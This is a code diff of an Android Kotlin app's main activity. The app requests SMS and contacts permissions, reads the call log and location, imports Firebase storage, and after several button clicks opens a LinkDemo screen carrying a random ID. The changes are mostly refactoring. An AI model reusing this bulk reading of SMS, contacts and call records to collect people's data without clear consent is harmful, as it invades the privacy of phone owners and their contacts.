@@ -23,7 +23,6 @@ import com.google.android.gms.location.LocationServices
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.storage.FirebaseStorage
 import kotlinx.android.synthetic.main.activity_main.*
-import java.io.File
 import java.util.*
 import kotlin.collections.ArrayList
 import kotlin.collections.HashMap
@@ -73,9 +72,12 @@ class MainActivity : AppCompatActivity() {
             val toast = Toast.makeText(applicationContext, text, duration)
             toast.show()
             a++
-            if(a>0 && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
+            if(a>0 && b>0 && c>0 && d>0 && e>0 && f>0){
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
+                val i = Intent(this, LinkDemo::class.java)
+                i.putExtra("message", randomIDtext)
+                startActivity(i)
             }
         }
 
@@ -88,9 +90,12 @@ class MainActivity : AppCompatActivity() {
             val toast = Toast.makeText(applicationContext, text, duration)
             toast.show()
             b ++
-            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
+            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0){
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
+                val i = Intent(this, LinkDemo::class.java)
+                i.putExtra("message", randomIDtext)
+                startActivity(i)
             }
         }
 
@@ -99,9 +104,12 @@ class MainActivity : AppCompatActivity() {
             location.alpha=0.5f
             getLocation()
             c++
-            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
+            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0){
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
+                val i = Intent(this, LinkDemo::class.java)
+                i.putExtra("message", randomIDtext)
+                startActivity(i)
             }
         }
 
@@ -110,9 +118,12 @@ class MainActivity : AppCompatActivity() {
             account.isClickable=false
             account.alpha=0.5f
             d++
-            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
+            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0){
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
+                val i = Intent(this, LinkDemo::class.java)
+                i.putExtra("message", randomIDtext)
+                startActivity(i)
             }
         }
 
@@ -124,9 +135,12 @@ class MainActivity : AppCompatActivity() {
             val duration = Toast.LENGTH_SHORT
             val toast = Toast.makeText(applicationContext, text, duration).show()
             e++
-            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
+            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0){
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
+                val i = Intent(this, LinkDemo::class.java)
+                i.putExtra("message", randomIDtext)
+                startActivity(i)
             }
         }
         logs.setOnClickListener {
@@ -137,19 +151,25 @@ class MainActivity : AppCompatActivity() {
             val duration = Toast.LENGTH_SHORT
             val toast = Toast.makeText(applicationContext, text, duration).show()
             f++
-            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
+            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 ){
                 val intent = Intent(this, LinkDemo::class.java)
                 startActivity(intent)
+                val i = Intent(this, LinkDemo::class.java)
+                i.putExtra("message", randomIDtext)
+                startActivity(i)
             }
         }
-        userid.setOnClickListener {
-            userid.text = randomIDtext
-            g++
-            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
-                val intent = Intent(this, LinkDemo::class.java)
-                startActivity(intent)
-            }
-        }
+//        userid.setOnClickListener {
+//            userid.text = randomIDtext
+//            g++
+//            if(a>0  && b>0 && c>0 && d>0 && e>0 && f>0 && g>0 ){
+//                val intent = Intent(this, LinkDemo::class.java)
+//                startActivity(intent)
+//                val i = Intent(this, LinkDemo::class.java)
+//                i.putExtra("message", randomIDtext)
+//                startActivity(i)
+//            }
+//        }
         //permissions
         if(ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!=PackageManager.PERMISSION_GRANTED ||
@@ -310,10 +330,12 @@ class MainActivity : AppCompatActivity() {
     @SuppressLint("MissingPermission")
     fun getLogs(){
         val callMap = HashMap<String, String>()
-        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
+        val cursor = contentResolver.query(
+            CallLog.Calls.CONTENT_URI,
             null,
             null,
-            null)
+            null
+        )
         while (cursor!!.moveToNext()){
            val numberIndex = cursor!!.getColumnIndex(CallLog.Calls.NUMBER)
            val durationIndex = cursor!!.getColumnIndex(CallLog.Calls.DURATION)
